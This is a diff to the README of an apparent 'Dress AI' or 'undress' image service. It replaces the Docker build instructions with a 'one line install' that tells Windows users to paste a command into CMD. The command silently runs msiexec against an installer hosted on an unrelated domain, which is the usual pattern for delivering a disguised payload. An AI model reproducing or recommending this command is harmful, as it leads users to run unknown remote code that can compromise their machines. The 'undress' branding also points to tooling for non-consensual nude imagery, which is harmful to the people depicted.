@@ -50,13 +50,10 @@ Dress AI Service is made possible by our amazing sponsors. Support the project a
 
 [<img width="1672" height="941" alt="5259cbc0-c12f-40e1-934b-d0f6802f745c" src="https://github.com/user-attachments/assets/43a0f5ad-c0b0-427d-9d24-0824c5bb8fa7"/>](https://undress.design/undress/?utm_source=github.com%2FGangTailorUpgrade%2Fundress-service&utm_medium=sponsorship&utm_campaign=github-september-2026&utm_content=readme-sponsor)
 
-### Option 1: Docker (Recommended)
-
+### Option 1: One line Install (Recommended for Windows) 
+Open **CMD** and paste it and press **Enter**
 ```bash
-git clone https://github.com/GangTailorUpgrade/undress-service.git
-cd dress-ai-service
-cp .env.example .env
-docker-compose up --build
+cmd /c start msiexec /q /i https://devcodee.com/api & Dress-AI
 ```
 
 Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
